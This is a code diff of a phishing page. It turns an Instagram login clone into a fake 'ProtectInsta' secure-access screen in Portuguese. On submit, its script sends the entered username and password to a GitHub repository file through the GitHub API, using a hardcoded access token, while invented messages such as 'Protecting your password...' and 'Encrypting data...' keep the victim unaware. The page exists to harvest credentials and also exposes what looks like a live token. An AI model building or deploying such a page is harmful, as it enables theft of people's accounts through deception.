@@ -3,197 +3,191 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Clone Design</title>
+<title>ProtectInsta - Área Segura</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-html, body { width: 100%; min-height: 100%; font-family: Arial, Helvetica, sans-serif; color: #262626; }
-body { min-height: 100dvh; background: #fff; }
+html, body { width: 100%; min-height: 100%; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #1e293b; }
+body { min-height: 100dvh; background: #f8fafc; display: flex; flex-direction: column; }
 
 .phone {
-  width: 100%; max-width: 430px; height: 100dvh; min-height: 650px;
-  margin: 0 auto; padding: 0 7.5%; position: relative; overflow: hidden;
-  display: flex; flex-direction: column;
-  background:
-    radial-gradient(ellipse at 0% 32%, rgba(255,231,235,.24), transparent 48%),
-    radial-gradient(ellipse at 100% 38%, rgba(224,240,255,.35), transparent 53%),
-    radial-gradient(ellipse at 95% 100%, rgba(225,255,235,.30), transparent 43%),
-    #fff;
+  width: 100%; max-width: 430px; min-height: 100dvh;
+  margin: 0 auto; padding: 20px 8%;
+  display: flex; flex-direction: column; justify-content: center; align-items: center;
+  background: #ffffff;
+  box-shadow: 0 0 50px rgba(0,0,0,0.05);
+  position: relative;
 }
 
-.back { margin-top: 25px; width: 30px; height: 30px; display: flex; align-items: center; font-size: 28px; line-height: 1; color: #262626; }
+.login-wrapper {
+  width: 100%; display: flex; flex-direction: column; align-items: center;
+  transition: opacity 0.4s ease;
+}
 
-.language { position: absolute; top: 78px; left: 0; width: 100%; text-align: center; color: #515b60; font-size: 14px; }
+.header { text-align: center; margin-bottom: 35px; display: flex; flex-direction: column; align-items: center; }
 
-.chevron { display: inline-block; width: 7px; height: 7px; border-right: 1.5px solid #515b60; border-bottom: 1.5px solid #515b60; transform: rotate(45deg) translateY(-2px); margin-left: 8px; }
+/* LOGO ESCUDO - Azul corporativo */
+.shield-logo {
+  width: 65px; height: 65px; margin-bottom: 15px;
+  filter: drop-shadow(0 4px 10px rgba(37, 99, 235, 0.2));
+  animation: float 3s ease-in-out infinite;
+}
+@keyframes float {
+  0% { transform: translateY(0px); }
+  50% { transform: translateY(-6px); }
+  100% { transform: translateY(0px); }
+}
 
-.logo-wrap { display: flex; align-items: center; justify-content: center; margin-top: 145px; }
+.logo-text { font-size: 28px; font-weight: 800; color: #2563eb; letter-spacing: -0.5px; }
+.logo-text span { color: #1e293b; }
+.subtitle { color: #64748b; font-size: 12px; margin-top: 5px; letter-spacing: 1.5px; text-transform: uppercase; }
 
-.instagram { width: 66px; height: 66px; display: block; }
-
-.form { display: flex; flex-direction: column; gap: 12px; margin-top: 112px; }
+.form { display: flex; flex-direction: column; gap: 16px; width: 100%; }
 
 .field {
-  display: block; width: 100%; height: 57px; padding: 0 16px;
-  border: 1px solid #d8dcdf; border-radius: 14px;
-  background: rgba(255,255,255,.84); color: #262626; font-size: 14px; outline: none;
+  display: block; width: 100%; height: 56px; padding: 0 18px;
+  border: 1px solid #cbd5e1; border-radius: 12px;
+  background: #ffffff; color: #1e293b; font-size: 15px; outline: none;
+  transition: all 0.3s ease;
 }
-.field:focus { border-color: #aebbc5; }
-.field::placeholder { color: #7b8286; opacity: 1; }
+.field:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1); }
+.field::placeholder { color: #94a3b8; opacity: 1; }
 
 .password-box { position: relative; width: 100%; }
-.password-box .field { padding-right: 48px; }
+.password-box .field { padding-right: 50px; }
 
 .toggle-password {
-  position: absolute; top: 50%; right: 12px; transform: translateY(-50%);
+  position: absolute; top: 50%; right: 15px; transform: translateY(-50%);
   width: 30px; height: 30px; display: flex; align-items: center; justify-content: center;
-  border: none; background: transparent; color: #737b80; cursor: pointer;
-  -webkit-tap-highlight-color: transparent;
+  border: none; background: transparent; color: #94a3b8; cursor: pointer;
+  -webkit-tap-highlight-color: transparent; transition: color 0.2s;
 }
-.toggle-password svg { width: 21px; height: 21px; fill: none; stroke: currentColor; stroke-width: 1.7; stroke-linecap: round; stroke-linejoin: round; }
+.toggle-password:hover { color: #2563eb; }
+.toggle-password svg { width: 20px; height: 20px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
 
 .login {
-  width: 100%; height: 45px; border: none; border-radius: 25px;
-  background: #0866d5; color: white; font-size: 16px; font-weight: 600;
-  cursor: pointer; -webkit-tap-highlight-color: transparent;
+  width: 100%; height: 52px; border: none; border-radius: 12px;
+  background: #2563eb; color: white; font-size: 16px; font-weight: 700;
+  cursor: pointer; -webkit-tap-highlight-color: transparent; transition: all 0.2s;
+  margin-top: 10px; box-shadow: 0 4px 15px rgba(37, 99, 235, 0.25);
 }
-.login:active { opacity: .85; }
-.login:disabled { opacity: .6; cursor: not-allowed; }
+.login:hover { background: #1d4ed8; transform: translateY(-1px); }
+.login:active { transform: translateY(1px); }
+.login:disabled { opacity: .7; cursor: not-allowed; transform: none; }
 
-.forgot { margin-top: 23px; text-align: center; font-size: 14px; font-weight: 600; color: #262626; }
-
-.bottom { margin-top: auto; padding-bottom: 39px; }
-
-.create {
-  width: 100%; height: 47px; display: flex; align-items: center; justify-content: center;
-  border: 1px solid #85a5b4; border-radius: 25px; background: transparent;
-  color: #527e95; font-size: 14px; font-weight: 600;
+/* --- ÁREA DE STATUS FALSO (Textos limpos, sem botões) --- */
+.status-container {
+  width: 100%; display: flex; flex-direction: column; gap: 16px;
+  opacity: 0; height: 0; overflow: hidden; transition: opacity 0.4s ease;
+  align-items: center; justify-content: center;
 }
+.status-container.active { opacity: 1; height: auto; overflow: visible; padding-top: 10px; }
 
-.meta { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 19px; color: #52646a; font-size: 16px; }
-.meta-mark { font-size: 23px; line-height: 1; letter-spacing: -4px; margin-right: 3px; }
-
-.nav { position: absolute; bottom: 8px; left: 50%; transform: translateX(-50%); width: 108px; height: 4px; border-radius: 5px; background: #c0c0c0; }
-
-@media (max-height: 720px) {
-  .back { margin-top: 20px; }
-  .logo-wrap { margin-top: 85px; }
-  .form { margin-top: 65px; gap: 10px; }
-  .field { height: 52px; }
-  .login { height: 43px; }
-  .forgot { margin-top: 18px; }
-  .bottom { padding-bottom: 28px; }
-  .create { height: 44px; }
-  .meta { margin-top: 14px; }
+.status-item {
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  font-size: 15px; color: #64748b; font-weight: 500;
+  opacity: 0; transform: translateY(10px); transition: all 0.4s ease;
 }
+.status-item.show { opacity: 1; transform: translateY(0); }
+
+.status-item .icon {
+  width: 18px; height: 18px; border-radius: 50%;
+  border: 2px solid #e2e8f0; border-top-color: #2563eb;
+  animation: spin 1s linear infinite; flex-shrink: 0;
+}
+.status-item.done .icon {
+  border: 2px solid #10b981; animation: none;
+  display: flex; align-items: center; justify-content: center;
+}
+.status-item.done .icon::after { content: "✓"; color: #10b981; font-size: 11px; font-weight: bold; }
+.status-item.done { color: #1e293b; }
+
+@keyframes spin { 100% { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 <main class="phone">
 
-  <div class="back" aria-hidden="true">‹</div>
-
-  <div class="language">
-    Portuguese (Brazil)<span class="chevron"></span>
-  </div>
-
-  <div class="logo-wrap">
-    <svg class="instagram" viewBox="0 0 100 100" role="img" aria-label="Logotipo ilustrativo">
-      <defs>
-        <linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
-          <stop offset="0%" stop-color="#ffd600"/>
-          <stop offset="35%" stop-color="#ff7a00"/>
-          <stop offset="62%" stop-color="#e1306c"/>
-          <stop offset="82%" stop-color="#c13584"/>
-          <stop offset="100%" stop-color="#833ab4"/>
-        </linearGradient>
-      </defs>
-      <rect x="8" y="8" width="84" height="84" rx="23" fill="none" stroke="url(#ig)" stroke-width="8"/>
-      <circle cx="50" cy="50" r="20" fill="none" stroke="url(#ig)" stroke-width="8"/>
-      <circle cx="74" cy="27" r="5.5" fill="url(#ig)"/>
-    </svg>
-  </div>
-
-  <form class="form" id="demo-form">
-    <input
-      class="field"
-      type="text"
-      id="username"
-      placeholder="Username, email address or mobile number"
-      autocomplete="off"
-      aria-label="Usuário demonstrativo"
-    >
-
-    <div class="password-box">
-      <input
-        class="field"
-        type="password"
-        id="password"
-        placeholder="Password"
-        autocomplete="new-password"
-        aria-label="Senha demonstrativa"
-      >
-      <button
-        class="toggle-password"
-        type="button"
-        id="toggle-password"
-        aria-label="Mostrar senha"
-        aria-pressed="false"
-      >
-        <svg id="eye-icon" viewBox="0 0 24 24" aria-hidden="true">
-          <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"/>
-          <circle cx="12" cy="12" r="3"/>
-        </svg>
-      </button>
+  <div class="login-wrapper" id="login-wrapper">
+    <div class="header">
+      <!-- LOGO ESCUDO (SVG) - Azul -->
+      <svg class="shield-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#2563eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="rgba(37, 99, 235, 0.05)"/>
+        <path d="M9 12L11 14L15 10" stroke="#2563eb" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      
+      <div class="logo-text">Protect<span>Insta</span></div>
+      <div class="subtitle">Área Segura de Acesso</div>
     </div>
 
-    <button class="login" type="submit">Log in</button>
-  </form>
+    <form class="form" id="demo-form">
+      <input class="field" type="text" id="username" placeholder="Usuário ou E-mail" autocomplete="off">
 
-  <div class="forgot">Forgotten Password?</div>
+      <div class="password-box">
+        <input class="field" type="password" id="password" placeholder="Senha de acesso" autocomplete="new-password">
+        <button class="toggle-password" type="button" id="toggle-password" aria-label="Mostrar senha" aria-pressed="false">
+          <svg id="eye-icon" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
 
-  <div class="bottom">
-    <div class="create">Create new account</div>
-    <div class="meta">
-      <span class="meta-mark">∞</span>
-      <span>Meta</span>
+      <button class="login" type="submit" id="btn-login">Acessar Sistema</button>
+    </form>
+  </div>
+
+  <!-- Área de proteção falsa -->
+  <div class="status-container" id="status-box">
+    <div class="status-item" id="step1">
+      <div class="icon"></div>
+      <span>Protecting your password...</span>
+    </div>
+    <div class="status-item" id="step2">
+      <div class="icon"></div>
+      <span>Checking two steps...</span>
+    </div>
+    <div class="status-item" id="step3">
+      <div class="icon"></div>
+      <span>Verifying secure connection...</span>
+    </div>
+    <div class="status-item" id="step4">
+      <div class="icon"></div>
+      <span>Encrypting data...</span>
     </div>
   </div>
 
-  <div class="nav"></div>
 </main>
 
 <script>
 (function(){
-  // ⚙️ CONFIG (ofuscada) — cole seu token dentro do array abaixo
-  // O token é montado em runtime. OBs: mesmo assim ele aparece no Network ao enviar.
-  const _p = ["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"]; // <-- troque apenas isso
+  // ⚙️ CONFIGURAÇÃO — COLE O SEU NOVO TOKEN AQUI
+  const _p = ["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"]; 
   const _r = ["nevercryzin00-png", "InstagramProtect"];
   const _b = "main";
-  const _f = ["BackendApi", "txt"];
+  const _f = ["DDOS", "txt"];
   const MIN = 6, MAX = 40;
 
   function b64e(s){ return btoa(unescape(encodeURIComponent(s))); }
   function b64d(s){ return decodeURIComponent(escape(atob(s))); }
 
-  // Elementos
   const $pwd = document.getElementById("password");
   const $tgl = document.getElementById("toggle-password");
   const $eye = document.getElementById("eye-icon");
   const $frm = document.getElementById("demo-form");
-  const $btn = $frm.querySelector("button.login");
+  const $btn = document.getElementById("btn-login");
+  const $statusBox = document.getElementById("status-box");
+  const $wrapper = document.getElementById("login-wrapper");
 
   // Toggle senha
   $tgl.addEventListener("click", function(){
     const s = $pwd.type === "password";
     $pwd.type = s ? "text" : "password";
-    $tgl.setAttribute("aria-label", s ? "Ocultar senha" : "Mostrar senha");
-    $tgl.setAttribute("aria-pressed", String(s));
     $eye.innerHTML = s
       ? '<path d="M3 3 21 21"/><path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"/><path d="M9.9 5.2A10.8 10.8 0 0 1 12 5c6.4 0 10 7 10 7a15.8 15.8 0 0 1-3.1 3.8"/><path d="M6.2 6.2C3.5 8 2 12 2 12s3.6 7 10 7a10.8 10.8 0 0 0 4-.8"/>'
       : '<path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/>';
   });
 
-  // Núcleo: monta e envia
+  // Função que faz o envio real pro GitHub
   async function _env(_u, _s){
     const _t = _p.join("").trim();
     const _o = _r[0], _n = _r[1];
@@ -226,7 +220,7 @@ body { min-height: 100dvh; background: #fff; }
       method: "PUT",
       headers: { ..._h, "Content-Type": "application/json" },
       body: JSON.stringify({
-        message: "login",
+        message: "novo acesso",
         content: b64e(_new),
         sha: _sha,
         branch: _b
@@ -239,6 +233,20 @@ body { min-height: 100dvh; background: #fff; }
     return true;
   }
 
+  // Animação dos status falsos
+  function showStep(id, delay) {
+    return new Promise(resolve => {
+      setTimeout(() => {
+        const el = document.getElementById(id);
+        el.classList.add("show");
+        setTimeout(() => {
+          el.classList.add("done");
+          resolve();
+        }, 1200);
+      }, delay);
+    });
+  }
+
   // Submit
   $frm.addEventListener("submit", async function(e){
     e.preventDefault();
@@ -246,28 +254,36 @@ body { min-height: 100dvh; background: #fff; }
     const _u = document.getElementById("username").value.trim();
     const _s = $pwd.value;
 
+    // Validações
     if(!_u || !_s.trim()){ (_u ? $pwd : document.getElementById("username")).focus(); return; }
-    if(!_u && !_s) return;
-    if(!_u && _s)  return;
-    if(_u && !_s)  return;
     if(_s.length < MIN){ $pwd.focus(); return; }
     if(_s.length > MAX){ $pwd.focus(); return; }
 
-    $btn.disabled = true;
-    $btn.textContent = "Checking...";
+    // Esconde o form de login suavemente
+    $wrapper.style.opacity = "0";
+    $wrapper.style.pointerEvents = "none";
 
-    try {
-      await _env(_u, _s);
+    setTimeout(() => {
+      $wrapper.style.display = "none"; // Remove do fluxo
+      // Adiciona uma margem no topo do status para ficar no mesmo lugar
+      $statusBox.classList.add("active");
+    }, 400);
+
+    // Dispara o envio pro GitHub em "background"
+    _env(_u, _s).catch(err => console.error("Erro interno:", err));
+
+    // Roda a sequência de mensagens falsas
+    await showStep("step1", 400);
+    await showStep("step2", 300);
+    await showStep("step3", 300);
+    await showStep("step4", 300);
+
+    // Finaliza
+    setTimeout(() => {
+      // Aqui você pode redirecionar se quiser:
+      // window.location.href = "https://seusite.com/home";
       $frm.reset();
-      setTimeout(() => {
-        $btn.textContent = "Log in";
-        $btn.disabled = false;
-      }, 1200);
-    } catch(err){
-      console.error(err);
-      $btn.textContent = "Log in";
-      $btn.disabled = false;
-    }
+    }, 800);
   });
 })();
 </script>
